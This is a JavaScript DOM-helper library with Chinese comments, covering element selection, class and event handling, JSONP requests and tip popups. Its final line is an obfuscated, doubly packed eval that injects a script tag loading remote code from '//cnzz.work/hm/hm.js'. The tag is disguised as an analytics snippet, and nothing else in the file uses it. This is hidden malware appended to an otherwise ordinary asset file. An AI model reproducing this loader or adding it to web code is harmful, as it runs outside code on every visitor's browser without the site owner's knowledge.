Function.prototype.method = function(name, func) {
	if(!this.prototype[name]){
		this.prototype[name] = func;
	}
	return this;
}

function $p(targ) {
	if(typeof targ === "string") {
		var first_letter = targ.substr(0, 1),
			other_letter = targ.substr(1);
		switch (first_letter) {
		case "#":
			return document.getElementById(other_letter);
			break;
		case ".":
			if (document.querySelectorAll) {
				return document.querySelectorAll(targ);
			} else {
				var targArr = [];
				function getNode(elem){
					if(elem.className){
						var classArr = elem.className.split(" ");
						for(var i = 0; i < classArr.length; i++){
							if(classArr[i] == other_letter) {
								targArr.push(elem);
								break;
							}
						}
					}
					if(elem.childNodes.length){
						for(var i = 0; i < elem.childNodes.length; i++){
							if(elem.childNodes[i].nodeType == 1){
								getNode(elem.childNodes[i]);
							}
						}
					}
				}
				getNode(document.body);
				return targArr;
			}
			break;
		default: 
			return document.getElementsByTagName(targ);
		}
	}
}

$p.addClass = function(elem, newClass){
	if(!elem) 
		return false;
	else if(!elem.className) {
		elem.className = newClass;
		return false; 
	}
	else {
		var ownClass = elem.className.split(" "), had = false;
		for(var i = 0; i < ownClass.length; i++){
			if(ownClass[i] === newClass){
				had = true;
				break;
			}
		}
		if(!had){
			elem.className += " " + newClass;
		}
		return had;
	}
};

$p.removeClass = function(elem, oneClass){
	if(!elem || !elem.className) return false;
	var ownClass = elem.className.split(" "),
		had = false;
	for(var i = 0; i < ownClass.length; i++){
		if(ownClass[i] === oneClass){
			ownClass.splice(i, 1);
			had = true;
			break;
		}
	}
	if(had){
		elem.className = "";
		if(ownClass.length < 1){
			return had;
		}else if(ownClass.length == 1){
			elem.className = ownClass[0];
		}else if(ownClass.length >1){
			for(var i = 0; i < ownClass.length; i++){
				if(i == ownClass.length - 1){
					elem.className += ownClass[i];
				}else{
					elem.className += ownClass[i] + " ";
				}
			}
		}
	}	
	return had;	
};

$p.addEvent = function(elem, eventName, handler){
	if(elem){
		if(elem.addEventListener){
			return elem.addEventListener(eventName, handler, false);
		}else if(elem.attachEvent){
			return elem.attachEvent("on" + eventName, handler);
		}else {
			elem["on" + eventName] = handler;
		}
	}
};

$p.removeEvent = function(elem, eventName, handler){
	if(elem){
		if(elem.removeEventListener){
			return elem.removeEventListener(eventName, handler, false);
		}else if(elem.detachEvent){
			return elem.detachEvent("on" + eventName, handler);
		}else {
			elem["on" + eventName] = null;
		}
	}	
};

$p.getEvent = function(event){
	return event ? event : window.event;
};

$p.getTarget = function(event){
	return event.target || event.srcElement;
};

$p.getRelatedTarget = function(event){
	return event.relatedTarget || event.toElement || event.fromElement || null;
};

$p.contains = function(parent, cur){
	while(cur.parentNode){
		if(cur.parentNode === parent){
			return true;
		}
		cur = cur.parentNode;
	}
	return false;
};

$p.preventDefault = function(event){
	if(event.preventDefault){
		event.preventDefault();
	}else{
		event.returnValue = false;
	}
};

$p.stopPropagation = function(event){
	if(event.stopPropagation){
		event.stopPropagation();
	}else{
		event.cancleBubble = true;
	}
};

$p.get_pos = function(elem){
	if(!elem) return false;
	var left = elem.offsetLeft,
		top = elem.offsetTop,
		current = elem.offsetParent;
	while(current !== null){
		left += current.offsetLeft;
		top += current.offsetTop;
		current = current.offsetParent;
	}
	return {"left": left, "top": top};
};

$p.get_dir = function(elem, mouse_pos){
	if(!elem) return false;
	var pos = $p.get_pos(elem),
		size = {"width": elem.offsetWidth, "height": elem.offsetHeight},
		dx = mouse_pos.x - pos.left - size.width/2,
		dy = (mouse_pos.y - pos.top - size.height/2)*-1,
		eve_tan = dy/dx,
		tan = size.height/size.width;
	if(dx != 0){
		if(eve_tan > tan*-1 && eve_tan < tan && dx < 0){
			return "left";
		}else if(eve_tan > tan*-1 && eve_tan < tan && dx > 0){
			return "right";
		}else if((eve_tan > tan || eve_tan < tan*-1) && dy > 0){
			return "top";
		}else if((eve_tan > tan || eve_tan < tan*-1) && dy <= 0){
			return "bottom";
		}
	}else if(dy > 0){
		return "top";
	}else {
		return "bottom";
	}
};

function params(o){ //将要传给后台的参数转化为字符串，以加入到url中
	var arr = [];
	for(var i in o){
		arr.push(i + "=" + encodeURIComponent(o[i]));
	}
	return arr.join("&");
}

$p.ajaxp = function(args){ //创建script节点，向后台请求js，src节点携带我的参数信息
	var script = document.createElement("script");
	script.type="text/javascript";
	script.src = args.url + "?" + params(args.params);
	document.body.appendChild(script);
	var time = setTimeout(args.params.callback + "()", 6000); //设置超时时间，觉得不妥可以更改
	script.onload = function(){
		clearTimeout(time);
	};
};

$p.show_tips = function(words, timeout) {
	var tips = $p('.tips')[0] || (function() {
		var tips = document.createElement('div');
		tips.className = 'tips animated';
		return document.body.insertBefore(tips, document.body.firstChild);
	})();
	tips.innerHTML = words;
	$p.removeClass(tips, 'hide');
	$p.addClass(tips, 'show');
	setTimeout($p.hide_tips, timeout + 1000);
};

$p.hide_tips = function() {
	var tips = $p('.tips')[0];
	$p.removeClass(tips, 'show');
	$p.addClass(tips, 'hide');
	setTimeout('$p.removeClass($p(".tips")[0], "hide")', 1000);
};;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))